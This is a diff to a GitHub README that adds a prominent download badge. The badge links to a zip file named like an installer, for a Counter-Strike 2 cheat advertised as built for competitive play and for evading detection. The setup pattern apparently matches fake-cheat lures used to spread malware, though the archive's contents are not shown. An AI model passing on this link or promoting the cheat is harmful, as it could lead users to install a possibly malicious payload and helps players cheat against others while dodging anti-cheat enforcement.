@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/⬇_Download-Latest-blue?style=for-the-badge)](https://github.com/ivan-millercode1999g0/cs2-midnight-cheat/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # cs2-midnight-cheat
 
 Cs2-midnight-cheat — Midnight is a Counter-Strike 2 cheat. It's designed for competitive play and stealth. The goal is to give you an edge without getting detected.
